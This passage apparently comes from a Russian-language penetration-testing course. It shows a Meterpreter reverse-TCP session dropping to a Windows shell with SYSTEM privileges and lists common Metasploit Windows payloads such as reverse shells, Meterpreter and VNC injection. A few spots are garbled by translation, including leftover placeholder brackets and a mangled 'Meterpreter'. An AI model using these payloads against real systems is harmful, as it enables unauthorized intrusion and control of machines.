Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>
```

`Channel 1`Создан канал, и мы автоматически подключаемся к интерфейсу командной строки для этой машины. Здесь канал представляет собой соединение между нашим устройством и целевым хостом, которое установлено в обратном TCP-соединении (от целевого хоста к нам) с использованием Meterpreter Stager и Stage. Stager был активирован на нашей машине для ожидания запроса на соединение, инициированного полезной нагрузкой Stage на целевой машине.

В некоторых случаях переход в стандартную оболочку на целевой машине полезен, но Meterpreter также может перемещаться по машине жертвы и выполнять на ней действия. Таким образом, мы видим, что команды изменились, но уровень привилегий в системе остался прежним.

#### MSF - Windows CMD

  Полезная нагрузка

```shell-session
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>dir

dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users

21/07/2017  07:56    <DIR>          .
21/07/2017  07:56    <DIR>          ..
21/07/2017  07:56    <DIR>          Administrator
14/07/2017  14:45    <DIR>          haris
12/04/2011  08:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  15,738,978,304 bytes free

C:\Users>whoami

whoami
nt authority\system
```

Давайте посмотрим, какие еще типы полезных нагрузок мы можем использовать. Мы рассмотрим наиболее распространенные, связанные с операционными системами Windows.

---

## Типы полезной нагрузки

В таблице ниже приведены наиболее распространенные полезные нагрузки, используемые на компьютерах под управлением Windows, и их соответствующие описания.

|**Полезная нагрузка**|**Описание**|
|---|---|
|`generic/custom`|Универсальный слушатель, многоцелевое использование|
|`generic/shell_bind_tcp`|Универсальный слушатель, многоцелевой, обычная оболочка, привязка TCP-соединения|
|`generic/shell_reverse_tcp`|Универсальный слушатель, многоцелевое использование, обычная оболочка, обратное TCP-соединение|
|`windows/x64/exec`|Выполняет произвольную команду (Windows x64)|
|`windows/x64/loadlibrary`|Загружает произвольный путь к библиотеке x64.|
|`windows/x64/messagebox`|Создает диалоговое окно через MessageBox с настраиваемым заголовком, текстом и значком.|
|`windows/x64/shell_reverse_tcp`|Обычная оболочка, один полезный груз, обратное TCP-соединение|
|`windows/x64/shell/reverse_tcp`|Обычная оболочка, stager + stage, обратное TCP-соединение|
|`windows/x64/shell/bind_ipv6_tcp`|Обычная оболочка, stager + stage, IPv6 Bind TCP stager|
|`windows/x64/meterpreter/$`|Полезная нагрузка "Меинтерьера" + указанные выше разновидности|
|`windows/x64/powershell/$`|Интерактивные сеансы PowerShell + варианты, указанные выше.|
|`windows/x64/vncinject/$`|VNC-сервер (рефлективная инъекция) + вышеуказанные варианты|

К числу других критически важных полезных нагрузок, широко используемых специалистами по тестированию на проникновение при проведении оценок безопасности, относятся полезные нагрузки Empire и Cobalt Strike. Они не входят в рамки данного курса, но вы можете изучить их в свободное время, поскольку они могут дать значительное представление о том, как профессиональные специалисты по тестированию на проникновение проводят оценки важных объектов.

Помимо этого, конечно, существует множество других полезных нагрузок. Некоторые предназначены для конкретных производителей устройств, таких как Cisco, Apple или ПЛК. Некоторые мы можем сгенерировать сами, используя [укажите способ генерации] `msfvenom`. Однако далее мы рассмотрим [укажите способ генерации] `Encoders`и то, как их можно использовать для влияния на исход атаки.